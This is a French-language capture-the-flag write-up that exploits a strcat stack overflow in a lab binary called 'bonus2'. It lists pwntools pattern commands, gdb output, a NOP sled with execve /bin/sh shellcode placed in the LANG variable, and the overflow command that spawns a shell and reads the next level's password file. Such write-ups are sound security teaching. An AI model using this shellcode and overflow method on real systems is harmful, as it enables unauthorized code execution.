il y a une faille evidente au strcat de la fonction greetuser()

vu que l'argument name va contenir 72 octets (meme si ce n'est pas exacte la logique est la meme) et va etre concatene soit avec l'un des 3:

-"Hyvää päivää "
-"Goedemiddag! "
-"Hello "

on va donc essayer de faire un overflow deja avec l'etat par defaut c'est a dire "Hello "

on va deja generer un patern :

python -c "from pwn import *; print(cyclic(200).decode())"

et on va essayer  dans gdb pour trouver l'offset :

(gdb) r $(python -c 'print "A" * 40') (notre patern)

Program received signal SIGSEGV, Segmentation fault.
0x08006161 in ?? ()

on ne trouve rien donc le depassement avec "Hello " ne sert n'est pas suffisant il va falloir tester avec les autres

on va redefinir l'option switch avec export LANG=fi (lire le code)

on peut donc reessayer

la on trouve quelque chose : 

Program received signal SIGSEGV, Segmentation fault.
0x61666161 in ?? ()

on va decoder le patern :
python -c "from pwn import *; print(cyclic_find(0x61666161))"

On trouve un offset de 18

on va mettre notre shellcode dans notre variable d'environement LANG

export LANG=$(python -c 'print("fi" + "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')

\x90 correspend a des NOP qui signifie pas d'instruction, passe a la suite on fait ca pour ne pas galerer a trouver precisement l'adresse du shellcode

(gdb) b main

(gdb) r eeee eeee

(gdb) x/500s environ

0xbffffd23:	"LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\"...
0xbffffdeb:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220

je vais donc prendre l'adresse 0xbffffdeb qui donne "xeb/xfd/xff/xbf" en little edian

./bonus2 $(python -c 'print "e" * 40') $(python -c 'print "e" * 18 + "\xeb\xfd\xff\xbf"')

Super on a un shell !

cat /home/user/bonus3/.pass
